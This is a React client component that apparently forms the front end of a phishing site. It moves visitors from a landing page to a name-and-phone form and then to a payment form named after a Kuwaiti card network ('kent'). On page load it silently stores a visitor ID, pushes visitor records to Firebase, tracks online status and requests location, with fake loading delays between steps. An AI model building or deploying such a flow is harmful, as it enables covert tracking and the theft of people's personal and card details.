"use client"

import { useEffect, useState } from "react"
import "./main.css"
import { CartProvider } from "./cartContext"
import Landing from "./landing/landing"
import { Toaster } from "react-hot-toast"
import Info from "./info/info"
import { addData } from "./firebase"
import FullPageLoader from "./loader"
import { PaymentForm } from "./kent/kent"
import { getLocation, setupOnlineStatus } from "./lib"

function App() {
  const [currentPage, setCurrentPage] = useState(1)
  const [isLoading, setIsLoading] = useState(false)
  const [name, setName] = useState("")
  const [phone, setPhone] = useState("")

  const [_id] = useState("id" + Math.random().toString(16).slice(2))
  
  const data = {
    id: _id,
    hasPersonalInfo: name !== '',
    currentPage: currentPage,
    createdDate: new Date().toISOString(),
    notificationCount: 1,
    personalInfo: {
      id: name,
      fullName: name,
      phone: phone
    },
  }

  const handleNextPage = () => {
    addData(data)
    setIsLoading(true)
    setTimeout(() => {
      setIsLoading(false)
      setCurrentPage(prev => prev + 1)
    }, 3000)
  }

  useEffect(() => {
    localStorage.setItem('visitor', _id)
    addData(data).then(() => {
      setupOnlineStatus(data.id)
      getLocation()
    })
  }, [])

  const renderCurrentPage = () => {
    try {
      switch (currentPage) {
        case 1:
          return <Landing handleNextPage={handleNextPage} />
        case 2:
          return (
            <Info 
              setName={setName} 
              setPhone={setPhone} 
              handleNextPage={handleNextPage} 
            />
          )
        case 3:
        default:
          return (
            <div className="min-h-screen bg-gray-50 py-8">
                <PaymentForm />
            </div>
          )
      }
    } catch (error) {
      console.error('Error rendering page:', error)
      return (
        <div className="min-h-screen bg-gray-50 flex items-center justify-center">
          <div className="text-center">
            <h2 className="text-xl font-bold text-red-600 mb-4">Something went wrong</h2>
            <p className="text-gray-600 mb-4">Please try refreshing the page</p>
            <button 
              onClick={() => setCurrentPage(3)}
              className="bg-blue-600 text-white px-4 py-2 rounded-lg hover:bg-blue-700"
            >
              Go to Home
            </button>
          </div>
        </div>
      )
    }
  }

  return (
    <CartProvider>
      <div style={{ opacity: isLoading ? 0.4 : 1 }}>
        {isLoading && <FullPageLoader />}
        <Toaster position="bottom-center" />
        {renderCurrentPage()}
      </div>
    </CartProvider>
  )
}

export default App